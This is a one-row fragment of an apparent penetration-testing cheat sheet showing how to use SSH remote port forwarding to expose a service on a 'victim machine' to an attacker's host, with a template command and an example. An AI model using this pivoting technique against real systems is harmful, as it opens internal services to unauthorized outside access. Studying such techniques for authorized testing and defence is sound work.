...
| ssh | uses the built in ssh service to port forward a service | `ssh <attacker@attacker_ip> -R <attacker_ip>:<port to be opened in attacker machine>:<localhost>:<port which is running the service to be forwarded> -N ` ssh cyberwr3nch@192.168.XX.XX -R 192.168.XX.XX:3000:127.0.0.1:80 = Open the port 3000 in the cyberwr3nch's machine and forwards the service running in port 80 to the cyberwr3nch's 3000. So visiting 127.0.0.1:3000 in cyberwr3nch's browser will be the same of visiting 127.0.0.1:80 on the victim machine|
